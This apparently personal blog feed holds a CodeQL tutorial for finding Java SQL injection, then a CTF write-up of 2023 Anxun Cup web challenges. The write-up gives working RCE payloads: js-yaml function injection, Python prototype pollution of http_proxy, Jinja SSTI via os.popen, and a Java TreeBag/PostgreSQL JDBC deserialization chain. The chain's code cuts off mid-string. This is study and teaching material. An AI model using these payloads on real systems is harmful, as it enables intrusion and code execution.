class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">    node.getType() instanceof PrimitiveType or</span><br><span class="line">    node.getType() instanceof BoxedType or</span><br><span class="line">    node.getType() instanceof NumberType or</span><br><span class="line">    exists(ParameterizedType pt| node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType )</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>以上代码的意思为：如果当前node节点的类型为基础类型，数字类型和泛型数字类型(比如List)时，就切断数据流，认为数据流断掉了，不会继续往下检测。<br>重新执行query，我们发现，刚才那条误报已经被成功消除啦。</p><p><img src="../images/image-20231229164818007.png" alt="image-20231229164818007"></p><blockquote><p>泛型就是指的是List<long>  这种   ParameterizedType这个指的就是泛型  pt.getTypeArgument(0) instanceof NumberType  这个指的就是泛型的第一个参数是不是Num类型</p></blockquote><p>这里执行的话是会返回True的  因为Node节点是会被匹配到的</p><h3 id="漏报解决"><a href="#漏报解决" class="headerlink" title="漏报解决"></a>漏报解决</h3><p>这个结果的返回时不全的  有些链子没有给我们返回来  例如下例语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public List&lt;Student&gt; getStudentWithOptional(Optional&lt;String&gt; username) &#123;</span><br><span class="line">        String sqlWithOptional = &quot;select * from students where username like &#x27;%&quot; + username.get() + &quot;%&#x27;&quot;;</span><br><span class="line">        //String sql = &quot;select * from students where username like ?&quot;;</span><br><span class="line">        return jdbcTemplate.query(sqlWithOptional, ROW_MAPPER);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里修复方法就是强制给其接上</p><p><img src="../images/1628394505_610f5409ded2fb0984439.jpg!small" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">isAdditionalTaintStep方法是CodeQL的类TaintTracking::Configuration提供的的方法，它的原型是：</span><br><span class="line"></span><br><span class="line">override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) &#123;&#125;</span><br><span class="line">覆盖谓词 isAdditionalTaintStep(DataFlow::Node 节点1, DataFlow::Node 节点2) &#123;&#125;</span><br><span class="line"></span><br><span class="line">它的作用是将一个可控节点</span><br><span class="line">A强制传递给另外一个节点B，那么节点B也就成了可控节点。</span><br></pre></td></tr></table></figure><p>多次测试之后，我认定是因为username.get()这一步断掉了。大概是因为Optional这种类型的使用没有在CodeQL的语法库里。</p><p>那么这里我们强制让username流转到username.get()，这样username.get()就变得可控了。这样应该就能识别出这个注入漏洞了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @id java/examples/vuldemo</span><br><span class="line"> * @name Sql-Injection</span><br><span class="line"> * @description Sql-Injection</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import semmle.code.java.security.QueryInjection</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">predicate isTaintedString(Expr expSrc, Expr expDest) &#123;</span><br><span class="line">    exists(Method method, MethodAccess call, MethodAccess call1 | expSrc = call1.getArgument(0) and expDest=call and call.getMethod() = method and method.hasName(&quot;get&quot;) and method.getDeclaringType().toString() = &quot;Optional&lt;String&gt;&quot; and call1.getArgument(0).getType().toString() = &quot;Optional&lt;String&gt;&quot;  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  VulConfig() &#123; this = &quot;SqlInjectionConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">    node.getType() instanceof PrimitiveType or</span><br><span class="line">    node.getType() instanceof BoxedType or</span><br><span class="line">    node.getType() instanceof NumberType or</span><br><span class="line">    exists(ParameterizedType pt| node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists(Method method, MethodAccess call |</span><br><span class="line">      method.hasName(&quot;query&quot;)</span><br><span class="line">      and</span><br><span class="line">      call.getMethod() = method and</span><br><span class="line">      sink.asExpr() = call.getArgument(0)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) &#123;</span><br><span class="line">    isTaintedString(node1.asExpr(), node2.asExpr())</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><p>注：以上我们实现了一个<code>isTaintedString</code>谓词，并使用exists子查询的方式实现了强制把<code>Optional&lt;String&gt; username</code>关联<code>Optional&lt;String&gt; username.get()</code>。<br>最终，我们的这个注入被跑了出来。</p><p><img src="../images/image-20231229170116821.png" alt="image-20231229170116821"></p><p>其实这个node跟下断点调试一样   一直跟着这个username来走  很详细</p><h2 id="CodeQL进阶查询"><a href="#CodeQL进阶查询" class="headerlink" title="CodeQL进阶查询"></a>CodeQL进阶查询</h2><h3 id="递归问题"><a href="#递归问题" class="headerlink" title="递归问题"></a>递归问题</h3><p>递归调用可以帮助我们解决一类问题：就是我们不确定这个方法我们需要调用多少次才能得到我们的结果，这个时候我们就可以用递归调用。</p><p><strong>CodeQL里面的递归调用语法是：在谓词方法的后面跟*或者+，来表示调用0次以上和1次以上（和正则类似），0次会打印自己。</strong><br>我们举一个例子：</p><p>在Java语言里，我们可以使用class嵌套class，多个内嵌class的时候，我们需要知道最外层的class是什么怎么办？<br>比如如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public class StudentService &#123;</span><br><span class="line"> </span><br><span class="line">    class innerOne &#123;</span><br><span class="line">        public innerOne()&#123;&#125;</span><br><span class="line"> </span><br><span class="line">        class innerTwo &#123;</span><br><span class="line">            public innerTwo()&#123;&#125;</span><br><span class="line"> </span><br><span class="line">            public String Nihao() &#123;</span><br><span class="line">                return &quot;Nihao&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        public String Hi()&#123;</span><br><span class="line">            return &quot;hello&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照非递归的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">from Class classes</span><br><span class="line">where classes.getName().toString() = &quot;innerTwo&quot;</span><br><span class="line">select classes.getEnclosingType().getEnclosingType()   // getEnclosingtype获取作用域</span><br></pre></td></tr></table></figure><p>使用递归的方法</p><p>我们在调用方法后面<strong>加*(从本身开始调用)或者+(从上一级开始调用)</strong>，来解决此问题。</p><p>(就是如开头所说  在谓词方法后面加上就行)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from Class classes</span><br><span class="line">where classes.getName().toString() = &quot;innerTwo&quot;</span><br><span class="line">select classes.getEnclosingType+()   // 获取作用域</span><br></pre></td></tr></table></figure><p>我们也可以自己封装方法来递归调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">RefType demo(Class classes) &#123;</span><br><span class="line">    result = classes.getEnclosingType()</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">from Class classes</span><br><span class="line">where classes.getName().toString() = &quot;innerTwo&quot;</span><br><span class="line">select demo*(classes)   // 获取作用域</span><br></pre></td></tr></table></figure><h3 id="强制类型转换问题"><a href="#强制类型转换问题" class="headerlink" title="强制类型转换问题"></a>强制类型转换问题</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">from Parameter param</span><br><span class="line">select param, param.getType()</span><br></pre></td></tr></table></figure><p>getType()目的就是获取项目中所有的参数的type信息。</p><p>以上代码的含义是打印所有方法参数的名称和类型。</p><p><img src="../images/image-20231229173522680.png" alt="image-20231229173522680"></p><p>如果我们进行强制类型转化呢  <strong>(简单的说就是把不符合的类型给过滤掉  留下符合的类型)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">from Parameter param</span><br><span class="line">select param, param.getType().(RefType)</span><br></pre></td></tr></table></figure><p>强制转换成RefType，意思就是从前面的结果当中过滤出RefType类型的参数。RefType是什么？引用类型，说白了就是<strong>去掉int等基础类型之后的数据。</strong></p><p><img src="../images/image-20231229173732428.png" alt="image-20231229173732428"></p><p>相比之前确实变少了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">from Parameter param</span><br><span class="line">select param, param.getType().(IntegralType)</span><br></pre></td></tr></table></figure><p>这是保留所有数字型的参数</p><p><img src="../images/image-20231229173907492.png" alt="image-20231229173907492"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/articles/web/283795.html&quot;&gt;https://www.freebuf.com/articles/web/283795.html&lt;/a&gt;  (主要参考)&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;h</summary>
      
    
    
    
    
    <category term="CodeQL" scheme="https://ke1nys.github.io/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>2023-安洵杯-web</title>
    <link href="https://ke1nys.github.io/posts/edb454bf.html"/>
    <id>https://ke1nys.github.io/posts/edb454bf.html</id>
    <published>2023-12-28T07:56:36.000Z</published>
    <updated>2024-01-20T15:32:19.398Z</updated>
    
    <content type="html"><![CDATA[<p>复现一下安洵的题目 这里就挑几道来复现就行了  复现地址的话在安洵平台上就可以</p><p><a href="https://dce.i-soon.net/#/topicBank">https://dce.i-soon.net/#/topicBank</a></p><p>直接访问就行了</p><h2 id="signal"><a href="#signal" class="headerlink" title="signal"></a>signal</h2><p>题目给了附件</p><p>⾸先这个题因为是把其他⽂件格式转换为yaml格式然后<code>yaml.load()</code>会加载为js对象</p><p><img src="../images/image-20231228160912485.png" alt="image-20231228160912485"></p><p>然后就去查这个<code>js-yaml</code>是否存在漏洞 啥的</p><p><img src="../images/image-20231228161524180.png" alt="image-20231228161524180"></p><p>这是默认为危险模式的最后⼀个版本，该模式允许您使⽤ tag 构造任意 JS 函数。!!js/function</p><p>直接去搜索<code>js-yaml RCE</code>  也能搜索到类似的文章</p><p><a href="https://nealpoole.com/blog/2013/06/code-execution-via-yaml-in-js-yaml-nodejs-module/">https://nealpoole.com/blog/2013/06/code-execution-via-yaml-in-js-yaml-nodejs-module/</a></p><p><img src="../images/image-20231228161658733.png" alt="image-20231228161658733"></p><p>最终payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;name&quot; : &#123; toString: !!js/function &quot;function()&#123; flag = process.mainModule.r</span><br><span class="line">equire(&#x27;child_process&#x27;).execSync(&#x27;cat /fla*&#x27;).toString(); return flag;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231228162001138.png" alt="image-20231228162001138">    </p><h2 id="Swagger-docs"><a href="#Swagger-docs" class="headerlink" title="Swagger docs"></a>Swagger docs</h2><p>这个题是比较值得记录的 </p><p><strong>(这个是在设置http_proxy后  然后可以伪造返回信息的  记录学习一下)</strong></p><p><img src="../images/image-20231228162830748.png" alt="image-20231228162830748"></p><p>访问给了挺多api接口的   在<code>/api-base/v0/search</code>这个接口处 发现存在任意文件读取</p><p><img src="../images/image-20231228163029766.png" alt="image-20231228163029766"></p><p>读取启动进程</p><p>然后将源码下载下来后进行审计</p><p>在update接口能 是存在一个python的原型链污染  熟悉的话应该能直接看出了</p><p><img src="../images/image-20231228163201826.png" alt="image-20231228163201826"></p><p>在search接口的话是存在这个模板渲染的</p><p><img src="../images/image-20231228163251241.png" alt="image-20231228163251241"></p><p>但是data不可控 因为他是访问服务器本地的api接口来获取文件</p><p><img src="../images/image-20231228163338058.png" alt="image-20231228163338058"></p><p>所以我们想控制返回内容来进行模板渲染的话  我们可以污染环境变量<code>http_proxy</code>  来使自己的服务器来当作代理服务器  从而控制返回内容<strong>(就是类似于中间人攻击)</strong></p><p>python原型链污染</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"> &quot;__init__&quot;: &#123;</span><br><span class="line"> &quot;__globals__&quot;: &#123;</span><br><span class="line"> &quot;os&quot;: &#123;</span><br><span class="line"> &quot;environ&quot;: &#123;</span><br><span class="line"> &quot;http_proxy&quot;:&quot;ip:port&quot;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20231228163625504.png" alt="image-20231228163625504"></p><p>然后随便发送一个请求  <code>if request.args.get(&#39;type&#39;) == &quot;text&quot;:</code>  type必须为text  不然不会进到模板渲染里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;cat EY6zl0isBvAWZFxZMvCCCTS3VRVMvoNi_FLAG&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231228163842734.png" alt="image-20231228163842734"></p><p>这里就是我们伪造的响应包 </p><p><img src="../images/image-20231228163900423.png" alt="image-20231228163900423"></p><p>结果返回</p><h2 id="ez-java"><a href="#ez-java" class="headerlink" title="ez_java"></a>ez_java</h2><p><a href="https://boogipop.com/2023/12/24/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%20Writeup/#ezjava">https://boogipop.com/2023/12/24/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%20Writeup/#ezjava</a>  参考wp</p><p>这个题就是如何连接上CB的断链 就是找新的反序列化入口</p><p><img src="../images/image-20231228164517887.png" alt="image-20231228164517887"></p><p>给的提示</p><p><img src="../images/image-20231228164542899.png" alt="image-20231228164542899"></p><p>看下有依赖  发现是存在三个依赖  那么就是用这三个东西来组合打了</p><p><img src="../images/image-20231228164639422.png" alt="image-20231228164639422"></p><p>在看了眼黑名单  发现是把<code>jackson</code>给过滤掉了  还把cb链的1前半段和后半段触发点给加黑名单了  那么就是用<code>cb</code>链和<code>postgresql</code>组合来打了</p><p><strong>(给了docker  看了眼  jdk是高版本  那么jndi和rmi是打不了了)</strong></p><p>前半段的话是<code>PriorityQueue</code>  用不了   那么我们就得找别的能序列化 并且能触发compare方法的类了</p><p>这里的话是有 treemap和treebag符合条件(这里使用treebag来演示)</p><p><img src="../images/image-20231228165256534.png" alt="image-20231228165256534"></p><p><img src="../images/image-20231228165325399.png" alt="image-20231228165325399"></p><p>这里的map 是指的treemap的实例化对象  跟进treemap的put方法</p><p><img src="../images/image-20231228165432706.png" alt="image-20231228165432706"></p><p><img src="../images/image-20231228165448651.png" alt="image-20231228165448651"></p><p>只要控制了这个comparator这个参数  那么我们就可以完全替代<code>PriorityQueue</code>了</p><p>那么我们就剩最后一步了  就是这个getter  这里给的是这个<code>postgresql</code>  于是就猜测是打他的jdbc</p><p><img src="../images/image-20231228170624169.png" alt="image-20231228170624169"></p><p>因为题目不出网  在加上给的源码中有个index.ftl  就不难想到是写入文件覆盖掉index.ftl里的内容</p><p>加上前面题目提示的BaseDataSource类  里面刚好是有个getconnection方法  于是链子就构造完成了</p><p><img src="../images/image-20231228170819795.png" alt="image-20231228170819795"></p><p>最终POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.axb;</span><br><span class="line"></span><br><span class="line"><span class="comment">//import com.google.gson.Gson;</span></span><br><span class="line"><span class="keyword">import</span> com.javasec.utils.SerializeUtils;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.bag.TreeBag;</span><br><span class="line"><span class="keyword">import</span> org.postgresql.ds.PGConnectionPoolDataSource;</span><br><span class="line"><span class="comment">//import org.apache.commons.collections.comparators.BooleanComparator;</span></span><br><span class="line"><span class="comment">//import org.apache.commons.collections.comparators.ComparableComparator;</span></span><br><span class="line"><span class="comment">//import org.apache.commons.collections.keyvalue.TiedMapEntry;</span></span><br><span class="line"><span class="comment">//import org.apache.commons.collections.map.LazyMap;</span></span><br><span class="line"><span class="comment">//import org.apache.commons.collections4.comparators.TransformingComparator;</span></span><br><span class="line"><span class="comment">//import org.apache.commons.collections.functors.ConstantTransformer;</span></span><br><span class="line"><span class="comment">//import org.apache.commons.collections4.Transformer;</span></span><br><span class="line"><span class="comment">//import org.apache.commons.collections4.functors.InvokerTransformer;</span></span><br><span class="line"><span class="comment">//import org.junit.Test;</span></span><br><span class="line"><span class="comment">//import org.postgresql.ds.PGConnectionPoolDataSource;</span></span><br><span class="line"><span class="comment">//import org.springframework.context.support.ClassPathXmlApplicationContext;</span></span><br><span class="line"><span class="comment">//import org.springframework.context.support.FileSystemXmlApplicationContext;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//    public void test() throws Exception &#123;</span></span><br><span class="line"><span class="comment">//        PGConnectionPoolDataSource pgConnectionPoolDataSource = new PGConnectionPoolDataSource();</span></span><br><span class="line"><span class="comment">//        String loggerLevel = &quot;debug&quot;;</span></span><br><span class="line"><span class="comment">//        String loggerFile = &quot;/app/templates/index.ftl&quot;;</span></span><br><span class="line"><span class="comment">//        String shellContent=&quot;&lt;#assign ac=springMacroRequestContext.webApplicationContext&gt;\n&quot;+&quot;&lt;#assign fc=ac.getBean(&#x27;freeMarkerConfiguration&#x27;)&gt;\n&quot;+&quot;&lt;#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;\n&quot;+&quot;&lt;#assign VOID=fc.setNewBuiltinClassResolver(dcr)&gt;/$&#123;\&quot;freemarker.template.utility.Execute\&quot;?new()(\&quot;cat /flag\&quot;)&#125;&quot;;</span></span><br><span class="line"><span class="comment">//        System.out.println(shellContent);</span></span><br><span class="line"><span class="comment">//        String jdbcUrl = &quot;jdbc:postgresql://&quot;+&quot;123&quot;+&quot;/aaaa?ApplicationName=&quot;+&quot;123123123&quot;+&quot;&amp;loggerFile=&quot;+loggerFile+&quot;&amp;loggerLevel=&quot;+loggerLevel;</span></span><br><span class="line"><span class="comment">//        pgConnectionPoolDataSource.setURL(jdbcUrl);</span></span><br><span class="line"><span class="comment">//        pgConnectionPoolDataSource.setServerNames(new String[]&#123;shellContent&#125;);</span></span><br><span class="line"><span class="comment">//        BeanComparator comparator = new BeanComparator();</span></span><br><span class="line"><span class="comment">//        SerializeUtils.setFieldValue(comparator, &quot;property&quot;, &quot;connection&quot;);</span></span><br><span class="line"><span class="comment">//        TreeBag treeBag = new TreeBag(comparator);</span></span><br><span class="line"><span class="comment">//        TreeMap&lt;Object,Object&gt; m = new TreeMap&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        SerializeUtils.setFieldValue(m, &quot;size&quot;, 2);</span></span><br><span class="line"><span class="comment">//        SerializeUtils.setFieldValue(m, &quot;modCount&quot;, 2);</span></span><br><span class="line"><span class="comment">//        Class&lt;?&gt; nodeC = Class.forName(&quot;java.util.TreeMap$Entry&quot;);</span></span><br><span class="line"><span class="comment">//        Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);</span></span><br><span class="line"><span class="comment">//        nodeCons.setAccessible(true);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        Object MutableInteger = SerializeUtils.createWithoutConstructor(&quot;org.apache.commons.collections.bag.AbstractMapBag$MutableInteger&quot;);</span></span><br><span class="line"><span class="comment">//        Object node = nodeCons.newInstance(pgConnectionPoolDataSource,MutableInteger, null);</span></span><br><span class="line"><span class="comment">//        Object right = nodeCons.newInstance(pgConnectionPoolDataSource, MutableInteger, node);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        SerializeUtils.setFieldValue(node, &quot;right&quot;, right);</span></span><br><span class="line"><span class="comment">//        SerializeUtils.setFieldValue(m, &quot;root&quot;, node);</span></span><br><span class="line"><span class="comment">//        SerializeUtils.setFieldValue(m, &quot;comparator&quot;, comparator);</span></span><br><span class="line"><span class="comment">//        SerializeUtils.setFieldValue(treeBag,&quot;map&quot;,m);</span></span><br><span class="line"><span class="comment">//        System.out.println(SerializeUtils.base64serial(treeBag));</span></span><br><span class="line"><span class="comment">//        SerializeUtils.deserTester(treeBag);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">PGConnectionPoolDataSource</span> <span class="variable">pgConnectionPoolDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PGConnectionPoolDataSource</span>();</span><br><span class="line">            <span class="type">String</span> <span class="variable">loggerLevel</span> <span class="operator">=</span> <span class="string">&quot;debug&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">loggerFile</span> <span class="operator">=</span> <span class="string">&quot;/app/templates/index.ftl&quot;</span>;</span><br><span class="line">            String shellContent=<span class="string">&quot;&lt;#assign ac=springMacroRequestContext.webApplicationContext&gt;\n&quot;</span>+<span class="string">&quot;&lt;#assign fc=ac.getBean(&#x27;freeMarkerConfiguration&#x27;)&gt;\n&quot;</span>+<span class="string">&quot;&lt;#assign 